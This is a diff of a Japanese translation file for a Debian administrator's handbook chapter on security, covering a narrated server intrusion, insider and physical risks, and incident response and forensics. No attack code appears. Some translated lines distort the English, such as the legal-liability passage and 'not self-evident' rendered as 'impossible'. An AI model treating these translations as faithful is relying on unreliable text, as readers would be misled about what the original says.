 msgid "At this point, the attacker has enough freedom of movement that they often install an IRC <emphasis>bot</emphasis> (a robot that connects to an IRC server and can be controlled by this channel). This bot is often used to share illegal files (unauthorized copies of movies or software, and so on). A determined attacker may want to go even further. The <literal>www-data</literal> account does not allow full access to the machine, and the attacker will try to obtain administrator privileges. Now, this should not be possible, but if the web application was not up-to-date, chances are that the kernel and other programs are outdated too; this sometimes follows a decision from the administrator who, despite knowing about the vulnerability, neglected to upgrade the system since there are no local users. The attacker can then take advantage of this second vulnerability to get root access."
-msgstr ""
+msgstr "この時点で、攻撃者は IRC <emphasis>ボット</emphasis> (IRC サーバに接続してチャンネルから操作されるロボット) をインストールできる程度の権限を取得しています。このボットは非合法ファイル (映画やソフトウェアなどの無断コピー) を共有するために使われます。意欲的な攻撃者は更に先へ行きます。<literal>www-data</literal> アカウントはマシンに対する完全なアクセスを許しませんので、攻撃者は管理者権限を取得しようとするでしょう。今現在、これは不可能であるべきです。しかし、ウェブアプリケーションが最新の状態でなければ、おそらくカーネルやその他のプログラムが古いでしょう; これはしばしばローカルユーザがいないため脆弱性に関して知っているにも関わらずシステムのアップグレードを無視している管理者の判断です。攻撃者はこの 2 番目の脆弱性に乗じて root アクセスを取得します。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> Privilege escalation"
-msgstr ""
+msgstr "<emphasis>VOCABULARY</emphasis> 特権昇格"
 
 #. Tag: para
 #, no-c-format
 msgid "This term covers anything that can be used to obtain more permissions than a given user should normally have. The <command>sudo</command> program is designed for precisely the purpose of giving administrative rights to some users. But the same term is also used to describe the act of an attacker exploiting a vulnerability to obtain undue rights."
-msgstr ""
+msgstr "この用語は通常ユーザに与えられていないより高位のパーミッションを取得するために使われる操作の全てを意味しています。<command>sudo</command> プログラムは、まさにユーザに指定した管理者権限を与える目的で、設計されました。しかし、同じ用語を使って、不当な権限を取得するために脆弱性を活用する攻撃者の振る舞いを表すこともあります。"
 
 #. Tag: para
 #, no-c-format
 msgid "Now the attacker owns the machine; they will usually try to keep this privileged access for as long as possible. This involves installing a <emphasis>rootkit</emphasis>, a program that will replace some components of the system so that the attacker will be able to obtain the administrator privileges again at a later time; the rootkit also tries hiding its own existence as well as any traces of the intrusion. A subverted <command>ps</command> program will omit to list some processes, <command>netstat</command> will not list some of the active connections, and so on. Using the root permissions, the attacker was able to observe the whole system, but didn't find important data; so they will try accessing other machines in the corporate network. Analyzing the administrator's account and the history files, the attacker finds what machines are routinely accessed. By replacing <command>sudo</command> or <command>ssh</command> with a subverted program, the attacker can intercept some of the administrator's passwords, which they will use on the detected servers… and the intrusion can propagate from then on."
-msgstr ""
+msgstr "これで、攻撃者はマシンを我が物にできます; 攻撃者は通常この特権アクセスを可能な限り長く維持しようとします。そのために攻撃者は <emphasis>rootkit</emphasis> をインストールします。<emphasis>rootkit</emphasis> とは、後から攻撃者が管理者権限を取得する事を可能にするために、幾つかのシステムの要素を置き替えるプログラムです; rootkit は自分の存在および侵入の形跡を隠そうとします。改ざんされた <command>ps</command> プログラムは幾つかのプロセスを無視するでしょうし、<command>netstat</command> は幾つかの活動中の接続をリストしません。root パーミッションを使って、攻撃者はシステム全体を観察することが可能です。しかし、重要なデータを見つけ出しません; 同じネットワーク内の他のマシンにアクセスしようとします。管理者アカウントと履歴ファイルを解析することで、攻撃者は日常的にアクセスしているマシンを見つけ出します。<command>sudo</command> や <command>ssh</command> を改ざんされたプログラムで置き換えることにより、攻撃者は管理者パスワードを横取りすることが可能です。攻撃者はここで横取りした管理者パスワード検出されたサーバで使い、更に侵入を進めます。"
 
 #. Tag: para
 #, no-c-format
 msgid "This is a nightmare scenario which can be prevented by several measures. The next few sections describe some of these measures."
-msgstr ""
+msgstr "最悪の筋書きは幾つかの取り組みによって避ける事が可能です。以降の節では、その取組について説明します。"
 
 #. Tag: title
 #, no-c-format
 msgid "Choosing the Software Wisely"
-msgstr ""
+msgstr "賢い方法でソフトウェアを選ぶ"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the potential security problems are known, they must be taken into account at each step of the process of deploying a service, especially when choosing the software to install. Many web sites, such as <literal>SecurityFocus.com</literal>, keep a list of recently-discovered vulnerabilities, which can give an idea of a security track record before some particular software is deployed. Of course, this information must be balanced against the popularity of said software: a more widely-used program is a more tempting target, and it will be more closely scrutinized as a consequence. On the other hand, a niche program may be full of security holes that never get publicized due to a lack of interest in a security audit."
-msgstr ""
+msgstr "潜在的なセキュリティ問題が知られると、管理者はサービスを配備するプロセスの各段階、特にインストールするソフトウェアを選ぶ際、に気を配らなければいけません。<literal>SecurityFocus.com</literal> などの多くのウェブサイトが最近発見された脆弱性をリストしています。このお陰で、あるソフトウェアを配備する前にそのソフトウェアのセキュリティ実績の情報を得ることが可能です。もちろん、この情報はそのソフトウェアの人気に比例しています: 広く使われているプログラムほど標的にされ、結果として注意深く検査されます。逆に、セキュリティ監査の興味を惹かないために、特定分野のプログラムはまだ公表されていないセキュリティホールを沢山持っているかもしれません。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> Security audit"
-msgstr ""
+msgstr "<emphasis>VOCABULARY</emphasis> セキュリティ監査"
 
 #. Tag: para
 #, no-c-format
 msgid "A security audit is the process of thoroughly reading and analyzing the source code of some software, looking for potential security vulnerabilities it could contain. Such audits are usually proactive and they are conducted to ensure a program meets certain security requirements."
-msgstr ""
+msgstr "セキュリティ監査とは、ソフトウェアが持つ潜在的なセキュリティ脆弱性を探すためにあるソフトウェアのソースコードを徹底的に読んだり解析することを言います。通常セキュリティ監査は積極的な行動であり、プログラムがある種のセキュリティ要件を満足していることを保証するために行われます。"
 
 #. Tag: para
 #, no-c-format
 msgid "In the Free Software world, there is generally ample room for choice, and choosing one piece of software over another should be a decision based on the criteria that apply locally. More features imply an increased risk of a vulnerability hiding in the code; picking the most advanced program for a task may actually be counter-productive, and a better approach is usually to pick the simplest program that meets the requirements."
-msgstr ""
+msgstr "通常フリーソフトウェア世界には多くの選択肢があります。そして、ソフトウェアは現場で適用する基準と同じ選択基準に従い決定するべきです。多くの機能を備えるということは、コードに隠された脆弱性の危険性を増加させることを意味します; 実際、あるタスクに関する最も先進的なプログラムを選ぶことは逆効果かもしれません。要求を満足する最も単純なプログラムを選ぶほうがより良いといえるでしょう。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> Zero-day exploit"
-msgstr ""
+msgstr "<emphasis>VOCABULARY</emphasis> ゼロデイ脆弱性"
 
 #. Tag: para
 #, no-c-format
 msgid "A <emphasis>zero-day exploit</emphasis> attack is hard to prevent; the term covers a vulnerability that is not yet known to the authors of the program."
-msgstr ""
+msgstr "<emphasis>ゼロデイ脆弱性</emphasis>攻撃は防ぐことが難しいです; この用語は対象プログラムの開発者がまだ知らない脆弱性を意味しています。"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing a Machine as a Whole"
-msgstr ""
+msgstr "マシン全体の管理"
 
 #. Tag: para
 #, no-c-format
 msgid "Most Linux distributions install by default a number of Unix services and many tools. In many cases, these services and tools are not required for the actual purposes for which the administrator set up the machine. As a general guideline in security matters, unneeded software is best uninstalled. Indeed, there's no point in securing an FTP server, if a vulnerability in a different, unused service can be used to get administrator privileges on the whole machine."
-msgstr ""
+msgstr "多くの Linux ディストリビューションはデフォルトで多数の Unix サービスと多くのツールをインストールします。多くの場合、デフォルトでインストールされるサービスとツールは管理者がマシンをセットアップする本来の目的に必要なものではありません。セキュリティに関する一般的な指針として、不要はソフトウェアをアンインストールすることが最良の方針です。実際、もし FTP サーバ以外の未使用のサービスに含まれる脆弱性を使ってマシン全体の管理者権限が取得される可能性があるのなら、FTP サーバを守ることに意味はありません。"
 
 #. Tag: para
 #, no-c-format
 msgid "By the same reasoning, firewalls will often be configured to only allow access to services that are meant to be publicly accessible."
-msgstr ""
+msgstr "同様の理由で、通常ファイヤーウォールは公開アクセス可能になる予定のサービスへのアクセスだけを許可するように設定されます。"
 
 #. Tag: para
 #, no-c-format
 msgid "Current computers are powerful enough to allow hosting several services on the same physical machine. From an economic viewpoint, such a possibility is interesting: only one computer to administrate, lower energy consumption, and so on. From the security point of view, however, such a choice can be a problem. One compromised service can bring access to the whole machine, which in turn compromises the other services hosted on the same computer. This risk can be mitigated by isolating the services. This can be attained either with virtualization (each service being hosted in a dedicated virtual machine), or with SELinux (each service daemon having an adequately designed set of permissions)."
-msgstr ""
+msgstr "現在のコンピュータは復数のサービスを 1 台の物理マシン上でホストできる程度に十分強力です。財政的な観点からすると、この可能性は興味深いものです: 管理するコンピュータの台数が 1 台ですむ、エネルギー消費量が少ないなど。しかしながら、セキュリティの観点からすると、この可能性は問題です。1 つのサービスが不正侵入を受けるだけでマシン全体にアクセス可能になり、さらに同じコンピュータ上でホストされている他のサービスも不正侵入を受けます。サービスを隔離することでこのリスクを緩和することが可能です。サービスの隔離は仮想化 (各サービスを専用の仮想マシンでホストさせる) や SELinux (それぞれのサービスデーモンに適切に設計された一連のパーミッションを設定する) を使って達成されます。"
 
 #. Tag: title
 #, no-c-format
 msgid "Users Are Players"
-msgstr ""
+msgstr "内部ユーザから保護"
 
 #. Tag: para
 #, no-c-format
 msgid "Discussing security immediately brings to mind protection against attacks by anonymous crackers hiding in the Internet jungle; but an often-forgotten fact is that risks also come from inside: an employee about to leave the company could download sensitive files on the important projects and sell them to competitors, a negligent salesman could leave their desk without locking their session during a meeting with a new prospect, a clumsy user could delete the wrong directory by mistake, and so on."
-msgstr ""
+msgstr "セキュリティに関する議論と言えばすぐに、Internet の無法地帯に隠れた匿名のクラッカーによる攻撃に対する保護を思い浮かべることでしょう; しかし、忘れられがちですが、内部にもリスクが有るという事実があります: 退職を控えている雇用者は重要なプロジェクトの機密ファイルをダウンロードしてこれを競争相手に売る事が可能です。不注意なセールスマンは新しい顧客とのミーティング中にセッションをロックせずに離席します。不器用なユーザは誤って間違ったディレクトリを削除します。"
 
 #. Tag: para
 #, no-c-format
 msgid "The response to these risks can involve technical solutions: no more than the required permissions should be granted to users, and regular backups are a must. But in many cases, the appropriate protection is going to involve training users to avoid the risks."
-msgstr ""
+msgstr "これらのリスクは技術的に解決可能です: 最低限必要な権限よりも高位の権限をユーザに与えるべきではありませんし、定期的なバックアップは必ず必要です。しかし多くの場合、リスクを避けるためにユーザを教育することがより適切なやり方といえるでしょう。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>QUICK LOOK</emphasis> <emphasis role=\"pkg\">autolog</emphasis>"
-msgstr ""
+msgstr "<emphasis>QUICK LOOK</emphasis> <emphasis role=\"pkg\">autolog</emphasis>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">autolog</emphasis> package provides a program that automatically disconnects inactive users after a configurable delay. It also allows killing user processes that persist after a session ends, thereby preventing users from running daemons."
-msgstr ""
+msgstr "<emphasis role=\"pkg\">autolog</emphasis> パッケージを使うことで、設定可能な遅延時間の後、活動していないユーザからの接続を自動的に切断することが可能です。また、セッションの終了した後に残っているユーザプロセスを kill することが可能です。これにより、ユーザがデーモンを実行することを避ける事が可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "Physical Security"
-msgstr ""
+msgstr "物理セキュリティ"
 
 #. Tag: para
 #, no-c-format
 msgid "There is no point in securing the services and networks if the computers themselves are not protected. Important data deserve being stored on hot-swappable hard disks in RAID arrays, because hard disks fail eventually and data availability is a must. But if any pizza delivery boy can enter the building, sneak into the server room and run away with a few selected hard disks, an important part of security is not fulfilled. Who can enter the server room? Is access monitored? These questions deserve consideration (and an answer) when physical security is being evaluated."
-msgstr ""
+msgstr "コンピュータ本体が保護されていなければ、サービスとネットワークの保護は無意味です。重要なデータは RAID アレイ内のホットスワップ対応のハードディスクに保存するだけの価値があります。なぜなら、ハードディスクはいつかは壊れ、データの可用性は不可欠だからです。しかし、ピザ配達人が建物に入って、サーバ部屋に忍び込んで、幾つかの選ばれたハードディスクを盗んで逃げる事が可能な場合、セキュリティの重要な部分が満足されていません。誰がサーバ部屋に入れるのでしょうか? 入室と退室は監視されていますか? これらの質問は、物理セキュリティがを評価する際に、考慮 (そして回答に) に値します。"
 
 #. Tag: para
 #, no-c-format
 msgid "Physical security also includes taking into consideration the risks for accidents such as fires. This particular risk is what justifies storing the backup media in a separate building, or at least in a fire-proof strongbox."
-msgstr ""
+msgstr "物理セキュリティには、例えば火事などの災害のリスクを考慮することが含まれます。この特別なリスクが有るために、バックアップメディアを別の建物か少なくとも防火金庫に保存することが正当化されます。"
 
 #. Tag: title
 #, no-c-format
 msgid "Legal Liability"
-msgstr ""
+msgstr "法的責任"
 
 #. Tag: para
 #, no-c-format
 msgid "An administrator is, more or less implicitly, trusted by their users as well as the users of the network in general. They should therefore avoid any negligence that malevolent people could exploit."
-msgstr ""
+msgstr "管理者は、程度の差はあるものの暗黙のうちに、自分の管理するユーザと一般のネットワークユーザから信頼されています。そのためユーザは悪意ある人が不法利用することで生じる過失の影響から守られています。"
 
 #. Tag: para
 #, no-c-format
 msgid "An attacker taking control of your machine then using it as a forward base (known as a “relay system”) from which to perform other nefarious activities could cause legal trouble for you, since the attacked party would initially see the attack coming from your system, and therefore consider you as the attacker (or as an accomplice). In many cases, the attacker will use your server as a relay to send spam, which shouldn't have much impact (except potentially registration on black lists that could restrict your ability to send legitimate emails), but won't be pleasant nevertheless. In other cases, more important trouble can be caused from your machine, for instance denial of service attacks. This will sometimes induce loss of revenue, since the legitimate services will be unavailable and data can be destroyed; sometimes this will also imply a real cost, because the attacked party can start legal proceedings against you. Rights-holders can sue you if an unauthorized copy of a work protected by copyright law is shared from your server, as well as other companies compelled by service level agreements if they are bound to pay penalties following the attack from your machine."
-msgstr ""
+msgstr "あるマシンの制御を奪った攻撃者は、このマシンを前進基地 (「踏み台」として知られています) として使います。管理しているマシンから他の不正な活動を実行されることにより、あなたは法的な問題を被る事になります。なぜなら、攻撃された当事者にしてみれば、あなたのシステムが攻撃元に見えるため、あなたを攻撃者本人 (または共犯者) とみなすでしょう。多くの場合、攻撃者はスパムを送信するための中継サーバとしてあなたのサーバを使います。これは大きな影響はありません (ブラックリストに登録されて、正規の電子メールを送信することに制限を受けるという潜在的な問題点を除けば)。とは言っても気持ちのよいものではありません。また別の場合、あなたのマシンはサービス拒否攻撃などのより重大な問題の要因になります。これはしばしば損失をもたらす場合があります。なぜなら、正規のサービスが利用不可能に陥り、データが破壊されるからです; さらに実質的な費用を失うという意味を持つ場合もあります。なぜなら、攻撃された当事者はあなたに対して法的手続きを開始するからです; 著作権で守られた作品の認可されていない複製があなたのサーバから共有された場合、権利者は訴訟を起こす事が可能です。さらに、サービス水準合意を交わした他の企業があなたのマシンから攻撃を受けた場合に罰金を支払う契約になっている場合、彼らも訴訟を起こす事が可能です。"
 
 #. Tag: para
 #, no-c-format
 msgid "When these situations occur, claiming innocence is not usually enough; at the very least, you will need convincing evidence showing suspect activity on your system coming from a given IP address. This won't be possible if you neglect the recommendations of this chapter and let the attacker obtain access to a privileged account (root, in particular) and use it to cover their tracks."
-msgstr ""
+msgstr "これらの状況に陥ると、無罪を主張だけでは通常十分ではありません; 少なくとも、ある IP アドレスを経由してあなたのシステム上で行われた疑わしい活動に関する説得力のある証拠を提出する必要があります。この章の推奨を無視し、攻撃者に特権アカウント (特に root) へのアクセスを取得を許し、攻撃者が痕跡を消すために特権アカウントを使うことを許していれば、これは不可能です。"
 
 #. Tag: title
 #, no-c-format
 msgid "Dealing with a Compromised Machine"
-msgstr ""
+msgstr "不正侵入されたマシンの取り扱い"
 
 #. Tag: para
 #, no-c-format
 msgid "Despite the best intentions and however carefully designed the security policy, an administrator eventually faces an act of hijacking. This section provides a few guidelines on how to react when confronted with these unfortunate circumstances."
-msgstr ""
+msgstr "最良の意志と注意深く設計されたセキュリティポリシーにも関わらず、結局のところ管理者は乗っ取りに直面します。この節では、不幸な状況に直面した場合にどのように対応するか、幾つかの指針を提供します。"
 
 #. Tag: title
 #, no-c-format
 msgid "Detecting and Seeing the Cracker's Intrusion"
-msgstr ""
+msgstr "クラッカー不正侵入の検知と観察"
 
 #. Tag: para
 #, no-c-format
 msgid "The first step of reacting to cracking is to be aware of such an act. This is not self-evident, especially without an adequate monitoring infrastructure."
-msgstr ""
+msgstr "クラッキング対応の最初の段階はこうした行為を把握することです。クラッキング行為を、特に十分な監視設備が無い状態で、把握することは不可能です。"
 
 #. Tag: para
 #, no-c-format
 msgid "Cracking acts are often not detected until they have direct consequences on the legitimate services hosted on the machine, such as connections slowing down, some users being unable to connect, or any other kind of malfunction. Faced with these problems, the administrator needs to have a good look at the machine and carefully scrutinize what misbehaves. This is usually the time when they discover an unusual process, for instance one named <literal>apache</literal> instead of the standard <literal>/usr/sbin/apache2</literal>. If we follow that example, the thing to do is to note its process identifier, and check <filename>/proc/<replaceable>pid</replaceable>/exe</filename> to see what program this process is currently running:"
-msgstr ""
+msgstr "クラッキング行為は、クラッキング行為がマシンでホストされている正規のサービスに直接的な影響をもたらすまで、例えば接続が遅くなったり一部のユーザが接続不可能になったり様々な誤作動が起きるまで、検知されないことが多いです。これらの問題に直面したら、管理者はマシンをよく見て不正行為を注意深く調べることが必要です。通常この時点で異常なプロセスが発見されます。例えば、標準的な <literal>/usr/sbin/apache2</literal> の代わりに <literal>apache</literal> と名付けられたプロセス等です。この例に従うなら、やるべきことはプロセス識別子を確認して、このプロセスが現在実行しているプログラムが何かを見るために <filename>/proc/<replaceable>pid</replaceable>/exe</filename> を確認することです:"
 
 #. Tag: screen
 #, no-c-format
@@ -2070,171 +2221,175 @@ msgid ""
 "<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>\n"
 "      "
 msgstr ""
+"\n"
+"<computeroutput># </computeroutput><userinput>ls -al /proc/3719/exe</userinput>\n"
+"<computeroutput>lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -&gt; /var/tmp/.bash_httpd/psybnc</computeroutput>\n"
+"      "
 
 #. Tag: para
 #, no-c-format
 msgid "A program installed under <filename>/var/tmp/</filename> and running as the web server? No doubt left, the machine is compromised."
-msgstr ""
+msgstr "プログラムが <filename>/var/tmp/</filename> の下にインストールされ、ウェブサーバの権限で実行している? 間違いありません。マシンは不正侵入されています。"
 
 #. Tag: para
 #, no-c-format
 msgid "This is only one example, but many other hints can ring the administrator's bell:"
-msgstr ""
+msgstr "これは一例に過ぎませんが、他にも管理者の注意を惹くような数多くの手掛かりが存在します:"
 
 #. Tag: para
 #, no-c-format
 msgid "an option to a command that no longer works; the version of the software that the command claims to be doesn't match the version that is supposed to be installed according to <command>dpkg</command>;"
-msgstr ""
+msgstr "動作しないコマンド; コマンドが要求するソフトウェアのバージョンが <command>dpkg</command> によってインストールされたと考えられるバージョンと一致しません;"
 
 #. Tag: para
 #, no-c-format
 msgid "a command prompt or a session greeting indicating that the last connection came from an unknown server on another continent;"
-msgstr ""
+msgstr "最後の接続元が別の大陸にある未知のサーバということを示すコマンドプロンプトやセッション挨拶文;"
 
 #. Tag: para
 #, no-c-format
 msgid "errors caused by the <filename>/tmp/</filename> partition being full, which turned out to be full of illegal copies of movies;"
-msgstr ""
+msgstr "<filename>/tmp/</filename> パーティションが満杯になったことによるエラー、大量の映画の不正コピーで一杯です;"
 
 #. Tag: para
 #, no-c-format
 msgid "and so on."
-msgstr ""
+msgstr "などです。"
 
 #. Tag: title
 #, no-c-format
 msgid "Putting the Server Off-Line"
-msgstr ""
+msgstr "サーバをオフラインにする"
 
 #. Tag: para
 #, no-c-format
 msgid "In any but the most exotic cases, the cracking comes from the network, and the attacker needs a working network to reach their targets (access confidential data, share illegal files, hide their identity by using the machine as a relay, and so on). Unplugging the computer from the network will prevent the attacker from reaching these targets, if they haven't managed to do so yet."
-msgstr ""
+msgstr "クラッキングが最も派手に行われる場合を除けば、クラッキングはネットワーク経由で行われ、攻撃者は目標 (機密データへのアクセス、不正ファイルの共有、踏み台としてマシンを使うことによる本人識別情報の隠匿、など) を達成するためにネットワークを必要とします。攻撃者がまだクラッキング行為を完了していない場合、ネットワークからコンピュータを切り離すことで、攻撃者は目標を達成できなくなります。"
 
 #. Tag: para
 #, no-c-format
 msgid "This may only be possible if the server is physically accessible. When the server is hosted in a hosting provider's data center halfway across the country, or if the server is not accessible for any other reason, it's usually a good idea to start by gathering some important information (see following sections), then isolating that server as much as possible by shutting down as many services as possible (usually, everything but <command>sshd</command>). This case is still awkward, since one can't rule out the possibility of the attacker having SSH access like the administrator has; this makes it harder to “clean” the machines."
-msgstr ""
+msgstr "サーバが物理的にアクセス可能な場合のみ、これは可能です。サーバが物凄く遠くにあるホスティングプロバイダのデータセンターでホストされていたり、サーバにその他の理由でアクセス出来ない場合、幾つかの重要な情報の収集 (以下の説を参照) を開始して、可能な限り多くの (通常 <command>sshd</command> を除く全ての) サービスをシャットダウンすることで可能な限りサーバを隔離する、ことは通常良いアイディアです。これはまだ都合が悪い状態です。なぜなら、攻撃者は管理者がしているのと同様に SSH アクセス可能だからです; このため、マシンを「きれいに」することは難しいです。"
 
 #. Tag: title
 #, no-c-format
 msgid "Keeping Everything that Could Be Used as Evidence"
-msgstr ""
+msgstr "証拠として使える全ての保存"
 
 #. Tag: para
 #, no-c-format
 msgid "Understanding the attack and/or engaging legal action against the attackers requires taking copies of all the important elements; this includes the contents of the hard disk, a list of all running processes, and a list of all open connections. The contents of the RAM could also be used, but it is rarely used in practice."
-msgstr ""
+msgstr "攻撃を理解したり、攻撃者に対して法的手段を取るには、全ての重要な要素の複製を取ることが必要です; これには、ハードディスクの内容、全ての実行中プロセスのリスト、全ての開かれた接続のリスト、が含まれます。RAM の内容を使うことも可能ですが、実際にこれが使われることはまれです。"
 
 #. Tag: para
 #, no-c-format
 msgid "In the heat of action, administrators are often tempted to perform many checks on the compromised machine; this is usually not a good idea. Every command is potentially subverted and can erase pieces of evidence. The checks should be restricted to the minimal set (<command>netstat -tupan</command> for network connections, <command>ps auxf</command> for a list of processes, <command>ls -alR /proc/[0-9]*</command> for a little more information on running programs), and every performed check should carefully be written down."
-msgstr ""
+msgstr "作業中に、管理者は不正侵入されたマシン上で数多くの事項を確認しようとします; これは良いアイディアではありません。全てのコマンドは潜在的に破壊されており、様々な証拠を消してしまいます。確認は最低限 (ネットワーク接続状態を確認する <command>netstat -tupan</command>、プロセスのリストを確認する <command>ps auxf</command>、実行中プログラムのより詳しい情報を確認する <command>ls -alR /proc/[0-9]*</command>) に留めるべきです。そして、全ての確認作業を注意深く記録するべきです。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>CAUTION</emphasis> Hot analysis"
-msgstr ""
+msgstr "<emphasis>CAUTION</emphasis> その場解析"
 
 #. Tag: para
 #, no-c-format
 msgid "While it may seem tempting to analyze the system as it runs, especially when the server is not physically reachable, this is best avoided: quite simply you can't trust the programs currently installed on the compromised system. It's quite possible for a subverted <command>ps</command> command to hide some processes, or for a subverted <command>ls</command> to hide files; sometimes even the kernel is compromised!"
-msgstr ""
+msgstr "特にサーバが物理的に到達できない場合、起動中のシステムを解析したいと思うかもしれませんが、これは特に避けるべきです: これは特に単純に言って、不正侵入されたシステムに現在インストールされているプログラムを信頼できないからです。破壊された <command>ps</command> コマンドを使えば一部のプロセスを非表示にしたり、破壊された  <command>ls</command> を使えば一部のファイルを非表示にすることが可能です。場合によってはカーネルに不正侵入されることすらあるのです!"
 
 #. Tag: para
 #, no-c-format
 msgid "If such a hot analysis is still required, care should be taken to only use known-good programs. A good way to do that would be to have a rescue CD with pristine programs, or a read-only network share. However, even those countermeasures may not be enough if the kernel itself is compromised."
-msgstr ""
+msgstr "これでもまだその場解析が必要な場合、既知の良好なプログラムだけを使うように注意するべきです。これを行う良い方法は、破壊されていないプログラムを備えたレスキュー CD または読み込み専用のネットワーク共有を使うことです。しかしながら、カーネル自身が不正侵入されている場合、これらの対策では不十分です。"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the “dynamic” elements have been saved, the next step is to store a complete image of the hard-disk. Making such an image is impossible if the filesystem is still evolving, which is why it must be remounted read-only. The simplest solution is often to halt the server brutally (after running <command>sync</command>) and reboot it on a rescue CD. Each partition should be copied with a tool such as <command>dd</command>; these images can be sent to another server (possibly with the very convenient <command>nc</command> tool). Another possibility may be even simpler: just get the disk out of the machine and replace it with a new one that can be reformatted and reinstalled."
-msgstr ""
+msgstr "「動的な」要素の保存が完了したら、次にハードディスクの完全なイメージを保存します。ファイルシステムの内容が書き変わっている間はそのようなイメージを作ることは不可能です。そのため、ファイルシステムを読み込み専用で再マウントする必要があります。最も簡単な解決策として、(<command>sync</command> を実行した後) サーバを無理矢理停止し、レスキュー CD を使って再起動することがよく行われます。各パーティションは <command>dd</command> などのツールを使ってコピーされるべきです; これらのイメージを他のサーバに送信することが可能です (場合によってはとても便利な <command>nc</command> ツールを使って送信します)。他のより簡単な方法もあります: 不正侵入されたマシンからディスクを取り出して、再フォーマットおよび再インストールしても問題ない新しいディスクで置き換えます。"
 
 #. Tag: title
 #, no-c-format
 msgid "Re-installing"
-msgstr ""
+msgstr "再インストール"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>backdoor</primary>"
-msgstr ""
+msgstr "<primary>バックドア</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The server should not be brought back on line without a complete reinstallation. If the compromise was severe (if administrative privileges were obtained), there is almost no other way to be sure that we're rid of everything the attacker may have left behind (particularly <emphasis>backdoors</emphasis>). Of course, all the latest security updates must also be applied so as to plug the vulnerability used by the attacker. Ideally, analyzing the attack should point at this attack vector, so one can be sure of actually fixing it; otherwise, one can only hope that the vulnerability was one of those fixed by the updates."
-msgstr ""
+msgstr "不正侵入されたサーバを、完全に再インストールする前に、オンラインに戻すべきではありません。不正侵入が深刻な場合 (管理者権限が奪われていた場合)、再インストール以外に攻撃者が残した全て (特に<emphasis>バックドア</emphasis>) が一掃されたことを保証する方法はほぼ存在しません。もちろん、攻撃者の使う脆弱性を塞ぐために、全ての最新のセキュリティ更新を適用しなければいけません。理想的に言えば、不正侵入の形跡を解析する事で、この最新のセキュリティ更新によって塞がれる脆弱性を使って不正侵入が行われたことが明らかになるべきです。そうすれば、実際に攻撃ベクトルが修正されたことを保証することが可能です; さもなければ、更新によって不正侵入の足掛かりとなった脆弱性が修正されたことを期待することしかできません。"
 
 #. Tag: para
 #, no-c-format
 msgid "Reinstalling a remote server is not always easy; it may involve assistance from the hosting company, because not all such companies provide automated reinstallation systems. Care should be taken not to reinstall the machine from backups taken later than the compromise. Ideally, only data should be restored, the actual software should be reinstalled from the installation media."
-msgstr ""
+msgstr "リモートサーバの再インストールは常に簡単というわけではありません; ホスティング会社の手助けが必要になる場合があります。なぜなら、ホスティング会社の全てが自動再インストールシステムを提供しているとは限らないからです。不正侵入後に取られたバックアップからマシンを再インストールしないように注意してください。理想的に言えば、データだけを回復するべきです。実際のソフトウェアはインストールメディアから再インストールされるべきです。"
 
 #. Tag: title
 #, no-c-format
 msgid "Forensic Analysis"
-msgstr ""
+msgstr "フォレンジック解析"
 
 #. Tag: para
 #, no-c-format
 msgid "Now that the service has been restored, it is time to have a closer look at the disk images of the compromised system in order to understand the attack vector. When mounting these images, care should be taken to use the <literal>ro,nodev,noexec,noatime</literal> options so as to avoid changing the contents (including timestamps of access to files) or running compromised programs by mistake."
-msgstr ""
+msgstr "サービスが回復したら、攻撃ベクトルを理解するために不正侵入されたシステムのディスクイメージの詳細な調査を開始します。これらのイメージをマウントする際に、<literal>ro,nodev,noexec,noatime</literal> オプションを使うことに注意してください。これは (ファイルにアクセスしたタイムスタンプを含めて) 内容の変更を防ぎ、誤って破壊されたプログラムを実行することを防ぐ意味合いがあります。"
 
 #. Tag: para
 #, no-c-format
 msgid "Retracing an attack scenario usually involves looking for everything that was modified and executed:"
-msgstr ""
+msgstr "通常、攻撃シナリオを辿るには、変更されて実行された全てを探し出す事が必要です。"
 
 #. Tag: para
 #, no-c-format
 msgid "<filename>.bash_history</filename> files often provide for a very interesting read;"
-msgstr ""
+msgstr "<filename>.bash_history</filename> ファイルには、極めて興味深い内容が含まれます;"
 
 #. Tag: para
 #, no-c-format
 msgid "so does listing files that were recently created, modified or accessed;"
-msgstr ""
+msgstr "最近作成、修正、アクセスされた listing ファイルも同様です;"
 
 #. Tag: para
 #, no-c-format
 msgid "the <command>strings</command> command helps identifying programs installed by the attacker, by extracting text strings from a binary;"
-msgstr ""
+msgstr "<command>strings</command> コマンドは攻撃者がインストールしたプログラムを識別する助けになります。このコマンドはバイナリからテキスト文字列を抽出します;"
 
 #. Tag: para
 #, no-c-format
 msgid "the log files in <filename>/var/log/</filename> often allow reconstructing a chronology of events;"
-msgstr ""
+msgstr "<filename>/var/log/</filename> 内のログファイルを使えば出来事の経過を辿る事が可能です;"
 
 #. Tag: para
 #, no-c-format
 msgid "special-purpose tools also allow restoring the contents of potentially deleted files, including log files that attackers often delete."
-msgstr ""
+msgstr "特殊目的のツールを使うことで、潜在的に削除されたファイルの内容を復元することが可能です。このファイルには攻撃者が削除したログファイルなどが含まれます。"
 
 #. Tag: para
 #, no-c-format
 msgid "Some of these operations can be made easier with specialized software. In particular, <emphasis>The Coroner Toolkit</emphasis> (in the <emphasis role=\"pkg\">tct</emphasis> package) is a collection of such tools. It includes several tools; amongst these, <command>grave-robber</command> can collect data from a running compromised system, <command>lazarus</command> extracts often interesting data from non-allocated regions on disks, and <command>pcat</command> can copy the memory used by a process; other data extraction tools are also included. <indexterm><primary>The Coroner Toolkit</primary></indexterm>"
-msgstr ""
